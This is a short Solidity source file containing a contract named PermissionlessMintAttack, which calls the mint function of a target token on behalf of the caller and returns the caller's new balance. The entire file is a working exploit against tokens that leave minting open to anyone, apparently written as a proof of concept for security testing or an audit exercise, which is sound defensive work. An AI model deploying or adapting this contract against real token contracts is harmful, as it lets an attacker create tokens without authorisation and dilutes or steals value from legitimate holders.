
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IToken {
    function mint(address to, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract PermissionlessMintAttack {
    function attack(address token, uint256 amount) external returns (uint256 minted) {
        IToken(token).mint(msg.sender, amount);
        return IToken(token).balanceOf(msg.sender);
    }
}
